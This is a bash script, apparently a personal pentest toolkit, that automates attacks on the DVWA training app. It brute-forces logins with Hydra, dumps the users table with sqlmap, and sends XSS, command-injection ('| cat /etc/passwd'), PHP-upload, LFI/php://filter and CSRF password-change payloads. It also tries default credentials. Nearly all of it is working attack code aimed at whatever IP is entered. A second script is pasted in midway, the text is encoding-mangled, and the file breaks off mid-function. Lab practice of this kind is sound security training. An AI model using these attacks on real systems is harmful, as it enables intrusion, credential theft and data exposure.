#!/bin/bash
# exploits.sh - DVWA exploits (UNIFIED)
# Utilise exploits_common.sh pour √©viter duplication

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh  # ‚Üê Lib commune

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Exploits DVWA (12 au total)
# ==========================

exploit_hydra() {
    clear; banner
    echo -e "${MAGENTA}üîê [Hydra Brute Force]${NC}"
    echo "üìñ Objectif : bruteforce login avec validation auto"
    echo "‚ö†Ô∏è Risque : d√©tection IDS, lock account (test local)"
    echo "üõ°Ô∏è Mitigation : rate limiting, CAPTCHA, 2FA"
    echo
    
    check_tools hydra curl
    
    mkdir -p "$LOG_DIR/hydra" "$LOG_DIR/hydra/validated"
    
    local IP PORT URL_PATH WORDLIST USERS_IN USERS_FILE TIMESTAMP OUT_LOG
    IP=$(get_host_ip)
    read -p "üåê IP cible ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    URL_PATH="/login.php"

    echo -e "${YELLOW}üìÇ Choisir la wordlist :${NC}"
    echo " 1) rockyou (/usr/share/wordlists/rockyou.txt)"
    echo " 2) mini (rapide)"
    echo " 3) custom"
    read -p "üëâ Choix (1/2/3) : " wl_choice

    local WORDLIST TMP_CREATED=""
    case "$wl_choice" in
        1)
            if [[ -f /usr/share/wordlists/rockyou.txt ]]; then
                WORDLIST="/usr/share/wordlists/rockyou.txt"
            elif [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
                TMP_CREATED="$(mktemp /tmp/rockyou.XXXXXX)"
                zcat /usr/share/wordlists/rockyou.txt.gz > "$TMP_CREATED"
                WORDLIST="$TMP_CREATED"
            else
                echo -e "${RED}‚ùå rockyou introuvable.${NC}"
                wl_choice=2
            fi
            ;;
        2)
            TMP_CREATED="$(mktemp /tmp/mini_hydra.XXXXXX)"
            cat > "$TMP_CREATED" <<'EOF'
123456
password
admin
toor
dvwa
EOF
            WORDLIST="$TMP_CREATED"
            ;;
        3)
            read -p "üìÅ Chemin complet du wordlist : " custom_path
            if [[ -f "$custom_path" ]]; then
                WORDLIST="$custom_path"
            else
                echo -e "${RED}‚ùå Fichier introuvable : $custom_path${NC}"
                [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"
                return
            fi
            ;;
        *)
            TMP_CREATED="$(mktemp /tmp/mini_hydra.XXXXXX)"
            cat > "$TMP_CREATED" <<'EOF'
123456
password
admin
EOF
            WORDLIST="$TMP_CREATED"
            ;;
    esac

    read -p "üë• Utilisateurs (csv) [admin,gordonb,1337,pablo,smithy]: " USERS_IN
    USERS_IN=${USERS_IN:-admin,gordonb,1337,pablo,smithy}
    USERS_FILE="$(mktemp /tmp/hydra_users.XXXXXX)"
    echo "$USERS_IN" | tr ',' '\n' > "$USERS_FILE"

    TIMESTAMP="$(date +%F_%H-%M-%S)"
    OUT_LOG="$LOG_DIR/hydra/hydra_${TIMESTAMP}.log"

    echo -e "${YELLOW}üöÄ Lancement Hydra...${NC}"
    timeout 300 hydra -L "$USERS_FILE" -P "$WORDLIST" "$IP" -s "$PORT" http-post-form \
        "${URL_PATH}:username=^USER^&password=^PASS^&Login=Login:Login failed" \
        -t 6 -V 2>&1 | tee "$OUT_LOG"

    echo -e "\n${CYAN}üìä Extraction des paires...${NC}"
    local FOUND_TMP="/tmp/hydra_found_${TIMESTAMP}.txt"
    grep -E "host: .*login: .*password:" "$OUT_LOG" 2>/dev/null \
      | sed -E 's/.*login: *([^ ]+).*password: *([^ ]+).*/\1:\2/' \
      | sort -u > "$FOUND_TMP" || true

    if [[ ! -s "$FOUND_TMP" ]]; then
        echo -e "${YELLOW}‚ö†Ô∏è Aucun credential trouv√©${NC}"
        rm -f "$USERS_FILE" "$FOUND_TMP"
        [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"
        log_exploit "$OUT_LOG" "INFO" "Hydra scan completed - no creds found"
        read -p "üëâ Entr√©e pour revenir..."
        return
    fi

    echo -e "${CYAN}üîÅ Validation automatique...${NC}"
    local VALIDATED_CSV="$LOG_DIR/hydra/validated/hydra_validated_${TIMESTAMP}.csv"
    > "$VALIDATED_CSV"

    local SUCCESS_REGEX="logout|welcome|index.php|logged in|DVWA"

    while IFS=: read -r user pass; do
        local COOKIE_JAR="$(mktemp /tmp/hydra_cookie.XXXXXX)"
        curl -s -c "$COOKIE_JAR" "http://${IP}:${PORT}/login.php" -o /dev/null

        curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -L \
            -d "username=${user}&password=${pass}&Login=Login" \
            "http://${IP}:${PORT}/login.php" -o /tmp/_hydra_res.html

        if grep -qiE "${SUCCESS_REGEX}" /tmp/_hydra_res.html; then
            echo "${user},${pass},VALID" >> "$VALIDATED_CSV"
            echo -e "${GREEN}‚úî VALID: ${user}:${pass}${NC}"
            log_exploit "$OUT_LOG" "SUCCESS" "Valid creds: ${user}:${pass}"
        else
            echo "${user},${pass},INVALID" >> "$VALIDATED_CSV"
            echo -e "${RED}‚úñ INVALID: ${user}:${pass}${NC}"
        fi
        rm -f "$COOKIE_JAR" /tmp/_hydra_res.html
    done < "$FOUND_TMP"

    sort -u -o "$VALIDATED_CSV" "$VALIDATED_CSV"

    echo -e "\n${CYAN}üìÑ R√©sum√© validation:${NC}"
    column -t -s, "$VALIDATED_CSV" 2>/dev/null || cat "$VALIDATED_CSV"
    
    local VALID_COUNT=$(grep -c ",VALID" "$VALIDATED_CSV" 2>/dev/null || echo 0)
    local INVALID_COUNT=$(grep -c ",INVALID" "$VALIDATED_CSV" 2>/dev/null || echo 0)
    echo -e "\n${GREEN}‚úÖ Valid√©s: ${VALID_COUNT}${NC} | ${RED}Invalid√©s: ${INVALID_COUNT}${NC}"

    rm -f "$USERS_FILE" "$FOUND_TMP"
    [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"

    echo -e "\n${GREEN}‚úÖ Scan termin√©. R√©sultats: ${VALIDATED_CSV}${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_sqlmap() {
    clear; banner
    echo -e "${MAGENTA}üß™ [SQL Injection - sqlmap]${NC}"
    echo "üìñ Objectif : exploiter SQLi avec sqlmap"
    echo "‚ö†Ô∏è Risque : fuite donn√©es (test local)"
    echo "üõ°Ô∏è Mitigation : prepared statements, WAF, least privilege"
    echo

    check_tools curl
    
    mkdir -p "$LOG_DIR/sqlmap/validated"

    local IP PORT PATH_VULN QUERY TARGET DVWA_USER DVWA_PASS
    IP=$(get_host_ip)
    read -p "üåê IP cible ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    read -p "üìÅ Path (/vulnerabilities/sqli/): " PATH_VULN
    PATH_VULN=${PATH_VULN:-/vulnerabilities/sqli/}
    read -p "üßæ Query (?id=1&Submit=Submit): " QUERY
    QUERY=${QUERY:-"?id=1&Submit=Submit"}
    TARGET="http://$IP:$PORT${PATH_VULN}${QUERY}"

    read -p "üë§ User DVWA (admin): " DVWA_USER; DVWA_USER=${DVWA_USER:-admin}
    read -p "üîë Pass DVWA (password): " DVWA_PASS; DVWA_PASS=${DVWA_PASS:-password}

    # Detect sqlmap
    local SQLMAP_CMD
    if [ -f "${HOME}/tools/sqlmap/sqlmap.py" ]; then
        SQLMAP_CMD="python3 ${HOME}/tools/sqlmap/sqlmap.py"
    elif command -v sqlmap >/dev/null 2>&1; then
        SQLMAP_CMD="sqlmap"
    else
        echo -e "${RED}‚ùå sqlmap introuvable${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi

    echo -e "\nüåê Target : ${TARGET}\n"
    echo -e "${YELLOW}üîë Connexion DVWA...${NC}"
    
    local COOKIE_TMP="/tmp/sqlmap_cookie_$$"
    rm -f "$COOKIE_TMP"
    local RAW_LOGIN=$(curl -s -c "$COOKIE_TMP" -L "http://$IP:$PORT/login.php")
    local USER_TOKEN=$(echo "$RAW_LOGIN" | grep -Po "name=['\"]user_token['\"].*?value=['\"]\K[^'\"]+" || true)

    if [ -n "$USER_TOKEN" ]; then
        curl -s -b "$COOKIE_TMP" -c "$COOKIE_TMP" -L \
            -d "username=${DVWA_USER}&password=${DVWA_PASS}&Login=Login&user_token=${USER_TOKEN}" \
            "http://$IP:$PORT/login.php" >/dev/null
    else
        curl -s -b "$COOKIE_TMP" -c "$COOKIE_TMP" -L \
            -d "username=${DVWA_USER}&password=${DVWA_PASS}&Login=Login" \
            "http://$IP:$PORT/login.php" >/dev/null
    fi

    local COOKIE_VALUE=$(awk '/PHPSESSID/ {print $7; exit}' "$COOKIE_TMP" 2>/dev/null || true)
    if [ -z "$COOKIE_VALUE" ]; then
        echo -e "${RED}‚ùå √âchec r√©cup√©ration PHPSESSID${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi
    
    local COOKIE="PHPSESSID=${COOKIE_VALUE}; security=low"
    echo -e "‚úî Session : PHPSESSID=${COOKIE_VALUE}"

    local TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    local OUT_DIR="$LOG_DIR/sqlmap/validated/$TIMESTAMP"
    mkdir -p "$OUT_DIR"
    
    local LOG_DBS="$OUT_DIR/sqlmap_dbs.log"
    local LOG_TABLES="$OUT_DIR/sqlmap_tables.log"
    local LOG_USERS="$OUT_DIR/sqlmap_users.log"

    echo -e "\n${YELLOW}‚ñ∂ Test sqlmap --dbs...${NC}"
    $SQLMAP_CMD "$TARGET" --cookie="$COOKIE" --batch --level=2 --risk=1 \
        --random-agent --output-dir="$OUT_DIR" --dbs 2>&1 | tee "$LOG_DBS"

    echo -e "\n${YELLOW}‚ñ∂ Tables (dvwa)...${NC}"
    $SQLMAP_CMD "$TARGET" --cookie="$COOKIE" --batch -D dvwa --tables 2>&1 | tee "$LOG_TABLES"

    echo -e "\n${YELLOW}‚ñ∂ Dump dvwa.users...${NC}"
    $SQLMAP_CMD "$TARGET" --cookie="$COOKIE" --batch -D dvwa -T users --dump 2>&1 | tee "$LOG_USERS"

    echo -e "\n${GREEN}‚úÖ SQLmap termin√©. Logs: $OUT_DIR${NC}"
    log_exploit "$LOG_DBS" "SUCCESS" "SQLmap exploitation completed"
    read -p "üëâ Entr√©e pour revenir..."
}

#!/bin/bash
# Correctifs pour TOUS les exploits DVWA avec probl√®mes de syntaxe
# √Ä remplacer dans ~/ghost00ls/modules/labs/dvwa/exploits.sh

# ===================================================================
# EXPLOIT 3 : XSS (CORRIG√â)
# ===================================================================
exploit_xss() {
    clear; banner
    echo -e "${MAGENTA}üß™ [XSS Hunting]${NC}"
    echo "üìñ Objectif : d√©tecter XSS r√©fl√©chis/basiques"
    echo "‚ö†Ô∏è Risque : session hijacking (test local)"
    echo "üõ°Ô∏è Mitigation : CSP, input validation, output encoding"
    echo

    check_tools curl

    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"

    # Payloads avec √©chappement correct
    echo -e "\n${YELLOW}‚ñ∂ Test XSS...${NC}"
    
    # Payload 1
    local payload1='<script>alert(1)</script>'
    local enc1=$(urlenc "$payload1")
    local url1="${BASE}/vulnerabilities/xss_r/?name=${enc1}"
    echo -e "${CYAN}Payload: $payload1${NC}"
    local resp1=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security=low" "$url1")
    if echo "$resp1" | grep -F "$payload1" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ XSS reflected${NC}"
        log_exploit "$LOG_DIR/xss.log" "SUCCESS" "XSS: payload1"
    else
        echo -e "${YELLOW}‚ö†Ô∏è Not reflected${NC}"
    fi
    
    # Payload 2
    local payload2='"><script>alert(1)</script>'
    local enc2=$(urlenc "$payload2")
    local url2="${BASE}/vulnerabilities/xss_r/?name=${enc2}"
    echo -e "${CYAN}Payload: \">...</script>${NC}"
    local resp2=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security=low" "$url2")
    if echo "$resp2" | grep -F "<script>alert(1)" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ XSS reflected${NC}"
        log_exploit "$LOG_DIR/xss.log" "SUCCESS" "XSS: payload2"
    else
        echo -e "${YELLOW}‚ö†Ô∏è Not reflected${NC}"
    fi
    
    # Payload 3
    local payload3="'><img src=x onerror=alert(1)>"
    local enc3=$(urlenc "$payload3")
    local url3="${BASE}/vulnerabilities/xss_r/?name=${enc3}"
    echo -e "${CYAN}Payload: '><img...${NC}"
    local resp3=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security=low" "$url3")
    if echo "$resp3" | grep -F "onerror=" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ XSS reflected${NC}"
        log_exploit "$LOG_DIR/xss.log" "SUCCESS" "XSS: payload3"
    else
        echo -e "${YELLOW}‚ö†Ô∏è Not reflected${NC}"
    fi

    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 4 : Command Injection (CORRIG√â)
# ===================================================================
exploit_cmdinj() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Command Injection]${NC}"
    echo "üìñ Objectif : injection commandes OS"
    echo "‚ö†Ô∏è Risque : RCE, data exfiltration"
    echo "üõ°Ô∏è Mitigation : input validation, whitelist, sandboxing"
    echo

    check_tools curl

    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"

    echo -e "\n${YELLOW}‚ñ∂ Test Command Injection...${NC}"
    
    # Payload 1: ; id
    local payload1="127.0.0.1; id"
    local enc1=$(urlenc "$payload1")
    local url1="${BASE}/vulnerabilities/exec/?ip=${enc1}&Submit=Submit"
    echo -e "${CYAN}Payload: 127.0.0.1; id${NC}"
    local resp1=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security=low" "$url1")
    if echo "$resp1" | grep -E "uid=|root:" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ Command Injection SUCCESS${NC}"
        log_exploit "$LOG_DIR/cmdinj.log" "SUCCESS" "CmdInj: payload1"
        echo "$resp1" | grep -A5 "uid="
        read -p "üëâ Entr√©e pour revenir..."
        return
    else
        echo -e "${YELLOW}‚ö†Ô∏è No execution detected${NC}"
    fi
    
    # Payload 2: && whoami
    local payload2="127.0.0.1 && whoami"
    local enc2=$(urlenc "$payload2")
    local url2="${BASE}/vulnerabilities/exec/?ip=${enc2}&Submit=Submit"
    echo -e "${CYAN}Payload: 127.0.0.1 && whoami${NC}"
    local resp2=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security=low" "$url2")
    if echo "$resp2" | grep -E "uid=|root:|www-data" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ Command Injection SUCCESS${NC}"
        log_exploit "$LOG_DIR/cmdinj.log" "SUCCESS" "CmdInj: payload2"
    else
        echo -e "${YELLOW}‚ö†Ô∏è No execution detected${NC}"
    fi
    
    # Payload 3: | cat /etc/passwd
    local payload3="127.0.0.1 | cat /etc/passwd"
    local enc3=$(urlenc "$payload3")
    local url3="${BASE}/vulnerabilities/exec/?ip=${enc3}&Submit=Submit"
    echo -e "${CYAN}Payload: 127.0.0.1 | cat /etc/passwd${NC}"
    local resp3=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security=low" "$url3")
    if echo "$resp3" | grep "root:" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ Command Injection SUCCESS (passwd leaked)${NC}"
        log_exploit "$LOG_DIR/cmdinj.log" "SUCCESS" "CmdInj: payload3"
    else
        echo -e "${YELLOW}‚ö†Ô∏è No execution detected${NC}"
    fi

    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 5 : File Upload (CORRIG√â - Ajout cookie + meilleure d√©tection)
# ===================================================================
exploit_upload() {
    clear; banner
    echo -e "${MAGENTA}üß™ [File Upload]${NC}"
    echo "üìñ Objectif : upload fichier malveillant"
    echo "‚ö†Ô∏è Risque : webshell, RCE"
    echo "üõ°Ô∏è Mitigation : file type validation, rename, sandbox"
    echo

    check_tools curl

    local IP PORT BASE WORKDIR PAYLOAD
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"
    
    WORKDIR=$(mktemp -d)
    PAYLOAD="$WORKDIR/shell.php"
    
    # Cr√©er payload simple
    echo '<?php echo "GHOST_UPLOAD_OK_".php_uname(); ?>' > "$PAYLOAD"

    echo -e "\n${YELLOW}‚ñ∂ Upload payload...${NC}"
    
    # Login d'abord pour obtenir un vrai cookie
    local COOKIE_JAR="$WORKDIR/cookie.txt"
    curl -s -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login" \
        "${BASE}/login.php" >/dev/null
    
    # Upload avec cookie valide
    local resp=$(curl -s -L --max-time 10 -b "$COOKIE_JAR" \
        -F "uploaded=@$PAYLOAD;filename=shell.php" \
        -F "Upload=Upload" \
        "${BASE}/vulnerabilities/upload/")
    
    if echo "$resp" | grep -qi "successfully uploaded\|succesfully uploaded"; then
        echo -e "${GREEN}‚úÖ Upload SUCCESS${NC}"
        log_exploit "$LOG_DIR/upload.log" "SUCCESS" "File uploaded: shell.php"
        
        # Test ex√©cution sur diff√©rents chemins possibles
        local paths=(
            "hackable/uploads/shell.php"
            "vulnerabilities/upload/../../hackable/uploads/shell.php"
            "DVWA/hackable/uploads/shell.php"
        )
        
        for path in "${paths[@]}"; do
            local test_url="${BASE}/${path}"
            echo -e "${CYAN}Test exec: $path${NC}"
            local exec_resp=$(curl -s -L --max-time 5 "$test_url")
            
            if echo "$exec_resp" | grep -q "GHOST_UPLOAD_OK"; then
                echo -e "${GREEN}‚úÖ Ex√©cution confirm√©e : $test_url${NC}"
                log_exploit "$LOG_DIR/upload.log" "SUCCESS" "Execution confirmed: $path"
                break
            fi
        done
    else
        echo -e "${RED}‚ùå Upload failed${NC}"
        echo -e "${YELLOW}Response preview:${NC}"
        echo "$resp" | head -n 20
    fi
    
    rm -rf "$WORKDIR"
    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 6 : LFI (CORRIG√â - Meilleure d√©tection)
# ===================================================================
exploit_lfi() {
    clear; banner
    echo -e "${MAGENTA}üß™ [File Inclusion (LFI/RFI)]${NC}"
    echo "üìñ Objectif : lecture fichiers sensibles"
    echo "‚ö†Ô∏è Risque : disclosure info, config leak"
    echo "üõ°Ô∏è Mitigation : whitelist, chroot, disable allow_url_include"
    echo

    check_tools curl

    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"

    # Login pour cookie valide
    local COOKIE_JAR=$(mktemp)
    curl -s -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login" \
        "${BASE}/login.php" >/dev/null

    echo -e "\n${YELLOW}‚ñ∂ Test LFI...${NC}"
    
    # Payload 1: /etc/passwd
    local payload1="../../../../../../etc/passwd"
    local enc1=$(urlenc "$payload1")
    local url1="${BASE}/vulnerabilities/fi/?page=${enc1}"
    echo -e "${CYAN}Payload: ../../etc/passwd${NC}"
    local resp1=$(curl -s -L --max-time 10 -b "$COOKIE_JAR" "$url1")
    if echo "$resp1" | grep "root:" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ LFI SUCCESS: /etc/passwd leaked${NC}"
        log_exploit "$LOG_DIR/lfi.log" "SUCCESS" "LFI: /etc/passwd"
        echo "$resp1" | grep "root:" | head -n 3
        rm -f "$COOKIE_JAR"
        read -p "üëâ Entr√©e pour revenir..."
        return
    else
        echo -e "${YELLOW}‚ö†Ô∏è /etc/passwd not found${NC}"
    fi
    
    # Payload 2: /etc/hosts
    local payload2="../../../../../../etc/hosts"
    local enc2=$(urlenc "$payload2")
    local url2="${BASE}/vulnerabilities/fi/?page=${enc2}"
    echo -e "${CYAN}Payload: ../../etc/hosts${NC}"
    local resp2=$(curl -s -L --max-time 10 -b "$COOKIE_JAR" "$url2")
    if echo "$resp2" | grep "127.0.0.1" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ LFI SUCCESS: /etc/hosts${NC}"
        log_exploit "$LOG_DIR/lfi.log" "SUCCESS" "LFI: /etc/hosts"
    else
        echo -e "${YELLOW}‚ö†Ô∏è /etc/hosts not found${NC}"
    fi
    
    # Payload 3: php://filter
    local payload3="php://filter/convert.base64-encode/resource=../../../config/config.inc.php"
    local enc3=$(urlenc "$payload3")
    local url3="${BASE}/vulnerabilities/fi/?page=${enc3}"
    echo -e "${CYAN}Payload: php://filter (config)${NC}"
    local resp3=$(curl -s -L --max-time 10 -b "$COOKIE_JAR" "$url3")
    if echo "$resp3" | grep -E "PD9waH|<?php" >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ LFI SUCCESS: config exposed (base64)${NC}"
        log_exploit "$LOG_DIR/lfi.log" "SUCCESS" "LFI: php://filter"
    else
        echo -e "${YELLOW}‚ö†Ô∏è Config not leaked${NC}"
    fi

    rm -f "$COOKIE_JAR"
    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 7 : CSRF (CORRIG√â - Meilleure d√©tection)
# ===================================================================
exploit_csrf() {
    clear; banner
    echo -e "${MAGENTA}üß™ [CSRF - Cross-Site Request Forgery]${NC}"
    echo "üìñ Objectif : forcer action non autoris√©e"
    echo "‚ö†Ô∏è Risque : actions malveillantes au nom de la victime"
    echo "üõ°Ô∏è Mitigation : CSRF tokens, SameSite cookies"
    echo

    check_tools curl

    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"

    # Login pour cookie valide
    local COOKIE_JAR=$(mktemp)
    curl -s -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login" \
        "${BASE}/login.php" >/dev/null

    echo -e "\n${YELLOW}‚ñ∂ R√©cup√©ration formulaire...${NC}"
    
    local form=$(curl -s -L -b "$COOKIE_JAR" "${BASE}/vulnerabilities/csrf/")
    
    local has_token=$(echo "$form" | grep -o "user_token" || echo "")
    
    if [ -z "$has_token" ]; then
        echo -e "${GREEN}‚úÖ Pas de token CSRF d√©tect√© (vuln√©rable)${NC}"
        log_exploit "$LOG_DIR/csrf.log" "SUCCESS" "CSRF vuln: no token"
    else
        echo -e "${YELLOW}‚ö†Ô∏è Token CSRF pr√©sent: $has_token${NC}"
    fi

    echo -e "\n${YELLOW}‚ñ∂ Test changement password sans token...${NC}"
    
    local resp=$(curl -s -L -b "$COOKIE_JAR" \
        "${BASE}/vulnerabilities/csrf/?password_new=ghost00ls&password_conf=ghost00ls&Change=Change")
    
    if echo "$resp" | grep -qi "password.*changed\|Password Changed"; then
        echo -e "${GREEN}‚úÖ CSRF SUCCESS: password chang√© sans token${NC}"
        log_exploit "$LOG_DIR/csrf.log" "SUCCESS" "CSRF: password changed"
    else
        echo -e "${RED}‚ùå CSRF √©chec (ou token requis)${NC}"
    fi

    rm -f "$COOKIE_JAR"
    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 8 : Broken Auth (CORRIG√â - Avec cookie persistent)
# ===================================================================
exploit_auth() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Broken Authentication]${NC}"
    echo "üìñ Objectif : test auth faible"
    echo "‚ö†Ô∏è Risque : account takeover"
    echo "üõ°Ô∏è Mitigation : strong passwords, MFA, account lockout"
    echo

    check_tools curl

    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"

    local creds=(
        "admin:password"
        "admin:admin"
        "gordonb:abc123"
        "1337:charley"
        "pablo:letmein"
        "smithy:password"
    )

    echo -e "\n${YELLOW}‚ñ∂ Test credentials par d√©faut...${NC}"
    
    for cred in "${creds[@]}"; do
        local user=$(echo "$cred" | cut -d':' -f1)
        local pass=$(echo "$cred" | cut -d':' -f2)
        
        echo -e "${CYAN}Testing: $user:$pass${NC}"
        
        local cookie_tmp="/tmp/auth_test_$$"
        local resp=$(curl -s -L -c "$cookie_tmp" \
            -d "username=$user&password=$pass&Login=Login" \
            "${BASE}/login.php")
        
        if echo "$resp" | grep -qi "logout\|welcome\|index.php.*logout"; then
            echo -e "${GREEN}‚úÖ Valid: $user:$pass${NC}"
            log_exploit "$LOG_DIR/auth.log" "SUCCESS" "Valid creds: $user:$pass"
        else
            echo -e "${RED}‚úñ Invalid: $user:$pass${NC}"
        fi
        
        rm -f "$cookie_tmp"
    done

    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 9 : IDOR (CORRIG√â - Avec cookie + meilleure d√©tection)
# ===================================================================
exploit_idor() {
    clear; banner
    echo -e "${MAGENTA}üß™ [IDOR - Insecure Direct Object Reference]${NC}"
    echo "üìñ Objectif : acc√®s non autoris√© via ID manipulation"
    echo "‚ö†Ô∏è Risque : data leakage, privilege escalation"
    echo "üõ°Ô∏è Mitigation : authorization checks, indirect references"
    echo

    check_tools curl

    local IP PORT BASE START_ID END_ID
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    read -p "üî¢ ID d√©but (1): " START_ID; START_ID=${START_ID:-1}
    read -p "üî¢ ID fin (10): " END_ID; END_ID=${END_ID:-10}
    BASE="http://$IP:$PORT"

    # Login pour cookie valide
    local COOKIE_JAR=$(mktemp)
    curl -s -c "$COOKIE_JAR" -d "username=admin&password=password&Login=Login" \
        "${BASE}/login.php" >/dev/null

    echo -e "\n${YELLOW}‚ñ∂ Test IDOR (IDs ${START_ID}-${END_ID})...${NC}"
    
    for id in $(seq $START_ID $END_ID); do
        # DVWA n'a pas de page IDOR par d√©faut, on teste sur weak_id
        local url="${BASE}/vulnerabilities/weak_id/source/jsonp.php?id=${id}"
        
        local resp=$(curl -s -L --max-time 5 -b "$COOKIE_JAR" "$url")
        local size=${#resp}
        
        if echo "$resp" | grep -qiE "admin|user|email|password|firstname|surname"; then
            echo -e "${GREEN}‚úÖ ID $id: data exposed (${size}B)${NC}"
            log_exploit "$LOG_DIR/idor.log" "SUCCESS" "IDOR: ID $id exposed"
            echo "$resp" | head -n 3
        else
            echo -e "${YELLOW}‚ö†Ô∏è ID $id: no obvious data (${size}B)${NC}"
        fi
    done

    rm -f "$COOKIE_JAR"
    read -p "üëâ Entr√©e pour revenir..."
}

# ===================================================================
# EXPLOIT 10 : Misconfig (CORRIG√â - Paths r√©alistes pour DVWA)
# ===================================================================
exploit_misconfig() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Security Misconfiguration]${NC}"
    echo "üìñ Objectif : d√©tecter mauvaises configurations"
    echo "‚ö†Ô∏è Risque : info disclosure, unpatched vulns"
    echo "üõ°Ô∏è Mitigation : hardening, updates, minimal exposure"
    echo

    check_tools curl

    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    BASE="http://$IP:$PORT"

    # Paths r√©alistes pour DVWA
    local paths=(
        "/robots.txt"
        "/phpinfo.php"
        "/config/config.inc.php"
        "/docs/"
        "/setup.php"
        "/.git/config"
        "/README.md"
        "/CHANGELOG.txt"
    )

    echo -e "\n${YELLOW}‚ñ∂ Test chemins sensibles...${NC}"
    
    for path in "${paths[@]}"; do
        local url="${BASE}${path}"
        
        local status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url")
        
        if [ "$status" = "200" ]; then
            echo -e "${GREEN}‚úÖ Accessible: $path ($status)${NC}"
            log_exploit "$LOG_DIR/misconfig.log" "SUCCESS" "Exposed: $path"
        elif [ "$status" = "403" ]; then
            echo -e "${YELLOW}‚ö†Ô∏è Forbidden (exists): $path ($status)${NC}"
        else
            echo -e "${RED}‚úñ Not found: $path ($status)${NC}"
        fi
    done

    echo -e "\n${YELLOW}‚ñ∂ Check headers s√©curit√©...${NC}"
    
    local headers=$(curl -s -I --max-time 5 "$BASE")
    
    local sec_headers=(
        "X-Frame-Options"
        "X-Content-Type-Options"
        "Strict-Transport-Security"
        "Content-Security-Policy"
        "X-XSS-Protection"
    )
    
    for hdr in "${sec_headers[@]}"; do
        if echo "$headers" | grep -qi "^$hdr"; then
            echo -e "${GREEN}‚úÖ $hdr pr√©sent${NC}"
        else
            echo -e "${RED}‚úñ $hdr manquant${NC}"
            log_exploit "$LOG_DIR/misconfig.log" "WARNING" "Missing header: $hdr"
        fi
    done

    read -p "üëâ Entr√©e pour revenir..."
}

exploit_dirb() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Directory Bruteforce]${NC}"
    echo "üìñ Objectif : d√©couvrir r√©pertoires/fichiers cach√©s"
    echo "‚ö†Ô∏è Risque : bruit r√©seau, IDS detection"
    echo "üõ°Ô∏è Mitigation : WAF, rate limiting"
    echo

    check_tools dirb

    local IP PORT BASE WORDLIST
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    read -p "üìÇ Wordlist (/usr/share/wordlists/dirb/common.txt): " WORDLIST
